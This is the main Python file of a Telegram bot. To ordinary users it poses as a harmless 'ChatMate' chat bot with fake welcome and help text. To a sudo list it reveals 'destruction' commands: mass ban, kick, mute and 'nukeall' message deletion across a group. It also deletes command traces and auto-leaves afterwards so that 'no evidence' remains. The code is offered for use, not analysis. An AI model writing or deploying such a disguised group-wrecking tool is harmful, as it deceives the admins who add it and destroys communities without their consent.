
"""
🔥 TELEGRAM BAN-ALL BOT - ULTRA POWERFUL & SECURE 🔥
The Most Advanced Telegram Group Management Bot Ever Created

🚀 FEATURES:
- Ultra-fast concurrent operations
- Advanced logging system  
- Stealth mode operations
- Auto-leave functionality
- Military-grade security
- Zero traces left behind

Developed by: @TeamXUpdate | GitHub: strad-dev131
"""

import asyncio
import sys
from pathlib import Path

from config import Config
from handlers.ban import BanHandler
from handlers.kick import KickHandler
from handlers.utils import Utils
from utils.logger import logger
from pyrogram import Client, filters
from pyrogram.types import Message

class UltraPowerfulBanBot:
    """The Most Powerful Telegram Ban Bot Ever Created"""
    
    def __init__(self):
        self.config = Config()
        self.app = Client(
            "ultra_banbot",
            api_id=self.config.API_ID,
            api_hash=self.config.API_HASH,
            bot_token=self.config.BOT_TOKEN
        )
        self.utils = Utils(self.app, self.config, logger)
        self.ban_handler = BanHandler(self.app, self.config, self.utils, logger)
        self.kick_handler = KickHandler(self.app, self.config, self.utils, logger)
        
        # Performance tracking
        self.operations_count = 0
        self.start_time = None
        
    async def setup(self):
        """Initialize the ultra-powerful bot"""
        import time
        self.start_time = time.time()
        logger.log_action("BOT_STARTUP", 0, 0, {"version": "Ultra-Powerful v2.0"})

    def register_handlers(self):
        """Register all ultra-powerful command handlers"""
        
        @self.app.on_message(filters.command("start"))
        async def start_command(client, message: Message):
            # Check if user is SUDO - show different messages
            if self.utils.is_sudo_user(message.from_user.id):
                # SUDO USER - Show real bot purpose
                if self.config.DELETE_COMMANDS:
                    try:
                        await message.delete()
                    except:
                        pass
                
                response = (
                    "🔥 **ULTRA-POWERFUL BAN BOT ACTIVATED!** 🔥\n\n"
                    "⚡ **REAL FEATURES:**\n"
                    "• Lightning-fast mass ban/kick\n"
                    "• Group destruction capabilities\n" 
                    "• Auto-leave after operations\n"
                    "• Stealth mode operations\n"
                    "• Military-grade security\n\n"
                    "🛡️ **SUDO-ONLY ACCESS** - Maximum Security\n"
                    "💀 **DESTRUCTION MODE** - Zero survivors\n"
                    "🚀 **ZERO TRACES** - Ultimate stealth\n\n"
                    "Use `/help` for destruction commands.\n\n"
                    "**⚡ The Most Powerful Ban Bot Ever Created!**\n"
                    "**Ready to destroy any group!**\n"
                    "**Developed by:** [@Team](https://t.me/Team)"
                )
                await message.reply_text(response)
                logger.log_action("START_COMMAND_SUDO", message.chat.id, message.from_user.id)
            else:
                # REGULAR USER - Show fake chatting bot message
                response = (
                    "👋 **Hello! I'm ChatMate Bot!** 🤖\n\n"
                    "🌟 **I'm here to make your chats more fun!**\n\n"
                    "💬 **Features:**\n"
                    "• Fun conversations\n"
                    "• Group entertainment\n"
                    "• Chat management helpers\n"
                    "• Interactive games\n"
                    "• Friendly assistance\n\n"
                    "🎉 **How to use:**\n"
                    "Just chat with me normally! I love talking with everyone.\n\n"
                    "❤️ **I'm designed to bring joy to your groups!**\n"
                    "Add me to your groups for more fun!\n\n"
                    "For support: [@Team](https://t.me/Team)\n\n"
                    "**✨ Let's chat and have fun together! ✨**"
                )
                await message.reply_text(response)
                logger.log_action("START_COMMAND_REGULAR", message.chat.id, message.from_user.id)

        @self.app.on_message(filters.command("help"))
        async def help_command(client, message: Message):
            if self.utils.is_sudo_user(message.from_user.id):
                # SUDO USER - Show real destruction commands
                if self.config.DELETE_COMMANDS:
                    try:
                        await message.delete()
                    except:
                        pass
                    
                help_text = """
🔥 **ULTRA-POWERFUL BAN BOT COMMANDS** 🔥

**💀 Destruction Commands:**
• `/banall` - Ban all members + auto-leave
• `/kickall` - Kick all members + auto-leave
• `/nukeall` - Ban all + delete all messages

**🔇 Control Commands:**
• `/muteall` - Mute all non-admin members
• `/unmuteall` - Unmute all muted members

**🤖 Bot Management:**
• `/kickbots` - Remove all bots from group

**📊 Statistics:**
• `/stats` - View bot statistics
• `/logs` - View recent actions

**⚡ ULTRA FEATURES:**
• **Stealth Mode** - Minimal traces
• **Auto-Leave** - No evidence left
• **Lightning Speed** - 15+ concurrent ops
• **Smart Protection** - Admins safe
• **Zero Logging** - Local files only

**🛡️ SECURITY:**
• Sudo-only access (ultra secure)
• Protected user system
• Self-protection enabled
• Admin bypass available

**👨‍💻 Developed by:**
• Telegram: [@TeamsXchat](https://t.me/Team)
• GitHub: [xbitcode](https://github.com/orgs/xbitcode)

**💀 THE MOST POWERFUL DESTRUCTION BOT EVER!**
"""
                await message.reply_text(help_text)
                logger.log_action("HELP_COMMAND_SUDO", message.chat.id, message.from_user.id)
            else:
                # REGULAR USER - Show fake chatting bot help
                help_text = """
👋 **ChatMate Bot Help** 🤖

**💬 Chat Commands:**
• Just talk to me naturally!
• `/start` - Get welcome message
• `/help` - Show this help menu

**🎮 Fun Features:**
• Interactive conversations
• Group entertainment
• Friendly responses
• Chat assistance

**🌟 Group Features:**
• Add me to groups for fun
• I help keep chats lively
• Friendly group member
• Chat moderation help

**❤️ About Me:**
I'm designed to make your Telegram experience more enjoyable! I love chatting and helping people have fun.

**📞 Support:**
For any questions, contact: [@Team](https://t.me/Team)

**✨ Let's have fun chatting together! ✨**
"""
                await message.reply_text(help_text)
                logger.log_action("HELP_COMMAND_REGULAR", message.chat.id, message.from_user.id)

        @self.app.on_message(filters.command("banall") & filters.group)
        async def banall_command(client, message: Message):
            await self.ban_handler.ban_all_members(message)

        @self.app.on_message(filters.command("nukeall") & filters.group)
        async def nukeall_command(client, message: Message):
            await self.ban_handler.nuke_all_members(message)

        @self.app.on_message(filters.command("unbanall") & filters.group)
        async def unbanall_command(client, message: Message):
            await self.ban_handler.unban_all_members(message)

        @self.app.on_message(filters.command("kickall") & filters.group)
        async def kickall_command(client, message: Message):
            await self.kick_handler.kick_all_members(message)

        @self.app.on_message(filters.command("kickbots") & filters.group)
        async def kickbots_command(client, message: Message):
            await self.kick_handler.kick_all_bots(message)

        @self.app.on_message(filters.command("muteall") & filters.group)
        async def muteall_command(client, message: Message):
            await self.ban_handler.mute_all_members(message)

        @self.app.on_message(filters.command("unmuteall") & filters.group)
        async def unmuteall_command(client, message: Message):
            await self.ban_handler.unmute_all_members(message)

        @self.app.on_message(filters.command("stats"))
        async def stats_command(client, message: Message):
            if not self.utils.is_sudo_user(message.from_user.id):
                return
            
            stats = logger.get_stats()
            import time
            uptime = int(time.time() - self.start_time) if self.start_time else 0
            
            stats_text = f"""
🔥 **ULTRA BOT STATISTICS** 🔥

**📊 Operations:**
• Total Operations: `{stats.get('total_operations', 0)}`
• Members Banned: `{stats.get('total_banned', 0)}`
• Members Kicked: `{stats.get('total_kicked', 0)}`
• Members Muted: `{stats.get('total_muted', 0)}`
• Groups Processed: `{stats.get('groups_processed', 0)}`

**⚡ Performance:**
• Bot Uptime: `{uptime}s`
• Concurrent Ops: `{self.config.MAX_CONCURRENT_OPERATIONS}`
• Batch Size: `{self.config.BATCH_SIZE}`

**🛡️ Security:**
• Stealth Mode: `{'ON' if self.config.STEALTH_MODE else 'OFF'}`
• Auto-Leave: `{'ON' if self.config.AUTO_LEAVE_AFTER_BAN else 'OFF'}`
• Delete Commands: `{'ON' if self.config.DELETE_COMMANDS else 'OFF'}`

**🚀 Status: ULTRA-POWERFUL & READY!**
"""
            await message.reply_text(stats_text)
            logger.log_action("STATS_COMMAND", message.chat.id, message.from_user.id)

        @self.app.on_message(filters.command("logs"))
        async def logs_command(client, message: Message):
            if not self.utils.is_sudo_user(message.from_user.id):
                return
            
            try:
                # Read last 10 actions
                with open("logs/actions.log", "r") as f:
                    lines = f.readlines()
                    recent_logs = lines[-10:] if len(lines) >= 10 else lines
                
                logs_text = "🔥 **RECENT BOT ACTIONS** 🔥\n\n"
                for log in recent_logs:
                    logs_text += f"`{log.strip()}`\n"
                
                if not recent_logs:
                    logs_text += "No recent actions logged."
                
                await message.reply_text(logs_text)
            except FileNotFoundError:
                await message.reply_text("📝 No logs available yet.")
            
            logger.log_action("LOGS_COMMAND", message.chat.id, message.from_user.id)

    async def run(self):
        """Start the ultra-powerful bot"""
        try:
            await self.setup()
            self.register_handlers()
            
            # Start the bot and keep it running
            await self.app.start()
            print("🔥 ULTRA-POWERFUL BAN BOT STARTED! 🔥")
            print("⚡ Ready to dominate Telegram groups!")
            print("🛡️ Sudo-only access enabled")
            print("🚀 Advanced logging active")
            
            # Keep the bot running indefinitely
            await asyncio.Event().wait()
            
        except Exception as e:
            logger.log_error(f"Bot startup error: {str(e)}")
            raise
        finally:
            # Cleanup on shutdown
            try:
                await self.app.stop()
                logger.log_action("BOT_SHUTDOWN", 0, 0)
            except:
                pass

async def main():
    """Main function to start the ultra-powerful bot"""
    bot = UltraPowerfulBanBot()
    await bot.run()

if __name__ == "__main__":
    # For Replit environment compatibility
    import nest_asyncio
    nest_asyncio.apply()
    
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if "This event loop is already running" in str(e):
            # Alternative method for environments with existing event loops
            loop = asyncio.get_event_loop()
            loop.create_task(main())
            loop.run_forever()
        else:
            raise
